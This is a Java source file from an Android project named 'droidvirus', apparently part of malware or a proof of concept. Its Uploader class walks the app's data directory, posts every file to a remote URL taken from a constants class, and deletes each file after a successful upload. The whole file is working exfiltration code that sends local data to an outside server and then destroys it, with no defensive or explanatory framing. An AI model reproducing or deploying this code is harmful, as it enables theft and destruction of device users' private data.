package com.artisanter.droidvirus;

import android.content.Context;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;

class Uploader {
    static void uploadAll(Context context) {
        String dir = context.getApplicationInfo().dataDir;
        for (File file : new File(dir).listFiles()) {
            if (file.isFile())
                postFile(file.getName(), file);
        }
    }

    private static void postFile(final String fileName, final File file) {
        String crlf = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        try {
            HttpURLConnection httpUrlConnection;
            URL url = new URL(Constants.URL);
            httpUrlConnection = (HttpURLConnection) url.openConnection();
            httpUrlConnection.setUseCaches(false);
            httpUrlConnection.setDoOutput(true);

            httpUrlConnection.setRequestMethod("POST");
            httpUrlConnection.setRequestProperty("Connection", "Keep-Alive");
            httpUrlConnection.setRequestProperty("Cache-Control", "no-cache");
            httpUrlConnection.setRequestProperty(
                    "Content-Type", "multipart/form-data;boundary=" + boundary);

            OutputStream outputStreamToRequestBody = httpUrlConnection.getOutputStream();
            BufferedWriter writer =
                    new BufferedWriter(new OutputStreamWriter(outputStreamToRequestBody));


            writer.write(twoHyphens + boundary + crlf);
            writer.write("Content-Disposition: form-data; " +
                    "name=\"" + fileName + "\";" +
                    "filename=\"" + fileName + "\"" + crlf);
            writer.write(crlf);
            writer.flush();


            FileInputStream inputStreamToLogFile = new FileInputStream(file);

            int bytesRead;
            byte[] dataBuffer = new byte[4096];
            while ((bytesRead = inputStreamToLogFile.read(dataBuffer)) != -1) {
                outputStreamToRequestBody.write(dataBuffer, 0, bytesRead);
            }
            outputStreamToRequestBody.flush();

            writer.write(crlf);
            writer.write(twoHyphens + boundary + twoHyphens + crlf);
            writer.flush();

            writer.close();
            outputStreamToRequestBody.close();


            int code = httpUrlConnection.getResponseCode();
            System.out.println(code);
            if(code == HttpURLConnection.HTTP_OK) {
                if(file.delete())
                    System.out.println("File deleted");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}

